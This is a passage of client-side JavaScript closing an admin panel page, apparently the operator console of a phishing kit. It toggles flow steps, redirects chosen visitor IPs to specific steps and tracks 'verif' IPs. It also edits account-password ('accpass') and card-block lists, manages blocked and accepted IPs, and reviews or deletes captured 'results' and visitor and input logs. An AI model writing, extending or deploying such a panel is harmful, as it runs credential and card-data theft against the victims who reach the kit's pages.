const enabled = data.config[step] !== false;
html += `<div class="step-control-item ${enabled ? '' : 'disabled'}"><div><div class="step-name">${steps[step]}</div><div class="step-desc">${enabled ? 'Enabled' : 'Disabled'}</div></div><div class="toggle-switch ${enabled ? 'active' : ''}" onclick="toggleStep('${step}', this)"></div></div>`;
});
container.innerHTML = html;
});
}

function toggleStep(step, el) {
const enabled = !el.classList.contains('active');
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=toggle_step&step=${step}&enabled=${enabled}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) { el.classList.toggle('active'); } });
}

function loadIPRedirects() {
fetch('admin.php?ajax=ip_redirects').then(r => r.json()).then(data => {
const list = document.getElementById('ip-redirects-list');
const redirects = data.redirects || {};
if (Object.keys(redirects).length === 0) { list.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No IP redirects configured</div>'; return; }
let html = '';
for (let ip in redirects) {
const step = redirects[ip];
html += `<div class="ip-redirect-item"><div><div class="ip">${escapeHtml(ip)}</div><div class="step">→ Redirect to: <strong style="color: #ef4444;">${step}</strong></div></div><button onclick="removeIPRedirect('${escapeHtml(ip)}')">Remove</button></div>`;
}
list.innerHTML = html;
});
}

function addIPRedirect() {
const ip = document.getElementById('redirect-ip').value.trim();
const step = document.getElementById('redirect-step').value;
if (!ip) { showNotification('Please enter IP address', true); return; }
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=add_ip_redirect&ip=${encodeURIComponent(ip)}&step=${encodeURIComponent(step)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) { document.getElementById('redirect-ip').value = ''; loadIPRedirects(); } });
}

function removeIPRedirect(ip) {
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=remove_ip_redirect&ip=${encodeURIComponent(ip)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadIPRedirects(); });
}

function loadVerifIPs() {
fetch('admin.php?ajax=verif_ips').then(r => r.json()).then(data => {
const list = document.getElementById('verif-ips-list');
if (!data.verif_ips || data.verif_ips.length === 0) { list.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No IPs recorded yet</div>'; return; }
let html = '<table style="width: 100%; border-collapse: collapse;">';
data.verif_ips.forEach(ip => {
html += `<tr style="border-bottom: 1px solid #1f2937;"><td style="padding: 15px; color: #10b981; font-family: monospace;">${escapeHtml(ip)}</td><td style="padding: 15px; text-align: right;"><button onclick="removeVerifIP('${escapeHtml(ip)}')" style="background: #ef4444; color: #fff; border: none; padding: 6px 15px; border-radius: 15px; cursor: pointer;">Remove</button></td></tr>`;
});
html += '</table>';
list.innerHTML = html;
});
}

function removeVerifIP(ip) {
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=remove_verif_ip&ip=${encodeURIComponent(ip)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadVerifIPs(); });
}

function clearVerifIPs() {
if (!confirm('Clear ALL verif IPs?')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=clear_verif_ips'})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadVerifIPs(); });
}

function saveFile(type) {
let content, action;
if (type === 'accpass') { content = document.getElementById('accpass-content').value; action = 'edit_accpass'; }
else if (type === 'blocklist') { content = document.getElementById('blocklist-content').value; action = 'edit_blocklist'; }
else if (type === 'cardblock') { content = document.getElementById('cardblock-content').value; action = 'edit_cardblock'; }
else if (type === 'blocked_ips') { content = document.getElementById('blocked-ips-content').value; action = 'edit_blocked_ips'; }
else if (type === 'accept_ips') { content = document.getElementById('accept-ips-content').value; action = 'edit_accept_ips'; }
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=${action}&content=${encodeURIComponent(content)}`})
.then(r => r.json()).then(data => showNotification(data.message, !data.success));
}

function blockIP() {
const ip = document.getElementById('new-ip').value.trim();
if (!ip) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=block_ip&ip=${encodeURIComponent(ip)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) { document.getElementById('new-ip').value = ''; loadBlockedIPs(); } });
}

function loadBlockedIPs() {
const content = document.getElementById('blocked-ips-content').value;
const ips = content.split('\n').filter(ip => ip.trim());
const list = document.getElementById('blocked-ips-list');
if (ips.length === 0) { list.innerHTML = '<div style="color: #666; padding: 20px;">No blocked IPs</div>'; return; }
let html = '<table style="width: 100%; border-collapse: collapse;">';
ips.forEach(ip => {
html += `<tr style="border-bottom: 1px solid #1f2937;"><td style="padding: 10px; color: #fff; font-family: monospace;">${escapeHtml(ip)}</td><td style="padding: 10px; text-align: right;"><button onclick="unblockIP('${escapeHtml(ip)}')" style="background: #10b981; color: #000; border: none; padding: 5px 15px; border-radius: 3px; cursor: pointer;">Unblock</button></td></tr>`;
});
html += '</table>';
list.innerHTML = html;
}

function unblockIP(ip) {
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=unblock_ip&ip=${encodeURIComponent(ip)}`})
.then(r => r.json()).then(data => {
showNotification(data.message, !data.success);
if (data.success) { const textarea = document.getElementById('blocked-ips-content'); textarea.value = textarea.value.replace(ip + '\n', '').replace(ip, ''); loadBlockedIPs(); }
});
}

function toggleResultSelection(index, checked) {
if (checked) selectedResults.add(index); else selectedResults.delete(index);
updateBulkDeleteButton();
}
function updateBulkDeleteButton() {
const btn = document.getElementById('bulk-delete-btn');
const count = document.getElementById('selected-count');
count.textContent = selectedResults.size;
btn.disabled = selectedResults.size === 0;
}
function bulkDeleteResults() {
if (!confirm('Delete ' + selectedResults.size + ' selected results?')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=bulk_delete_results&ids=' + encodeURIComponent(JSON.stringify([...selectedResults]))})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); selectedResults.clear(); loadResults(); });
}
function deleteResult(id) {
if (!confirm('Are you sure you want to delete this result?')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=delete_result&id=${id}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadResults(); });
}
function clearVisitors() {
if (!confirm('Are you sure you want to clear all visitor logs?')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=clear_visitors'})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) { lastVisitorsData = ''; isFirstLoad = true; loadVisitors(); } });
}
function clearAllResults() {
if (!confirm('Clear ALL results? This cannot be undone!')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=clear_all_results'})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadResults(); });
}
function escapeHtml(text) {
if (!text) return '';
const div = document.createElement('div');
div.textContent = text;
return div.innerHTML;
}
window.onbeforeunload = () => {
clearInterval(visitorsInterval);
clearInterval(statsInterval);
clearInterval(inputLogsInterval);
};
</script>
</body>
</html>